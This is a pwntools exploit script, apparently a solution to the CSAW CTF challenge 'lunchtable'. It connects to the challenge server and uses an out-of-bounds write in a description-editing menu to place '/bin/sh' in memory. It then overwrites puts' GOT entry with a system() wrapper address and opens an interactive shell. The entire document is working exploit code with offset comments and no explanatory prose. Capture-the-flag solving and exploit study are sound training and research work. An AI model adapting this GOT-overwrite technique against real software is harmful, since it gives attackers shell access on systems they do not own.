from pwn import *

# r = process('./lunchtable')
r = remote('pwn.chal.csaw.io', 1001)

system_wrapper = 0x40085c

r.recvuntil('What\'s your name?')
r.sendline('A')

r.recvuntil('Describe yourself, we want to know if you\'ll fit at our table...\n')
r.sendline('A')

r.recvuntil('Do you want to edit your description? (y/n): ')
r.sendline('y')

r.recvuntil('What do you want to change?')
r.sendline('32') # 0x6010c0 (goodbye) - 0x6010a0 (buffer) = 32 (decimal)

r.recvuntil('Give me something to replace that with')
r.sendline('/bin/sh')

r.recvuntil('Do you want to edit your description? (y/n): ')
r.sendline('y')

r.recvuntil('What do you want to change?')
r.sendline('-136') # 0x601018 (puts.got) - 0x6010a0 (buffer) = -136 (decimal)

r.recvuntil('Give me something to replace that with')
r.sendline(p64(system_wrapper))

r.recvuntil('Do you want to edit your description? (y/n): ')
r.sendline('n')

r.interactive()
r.close()
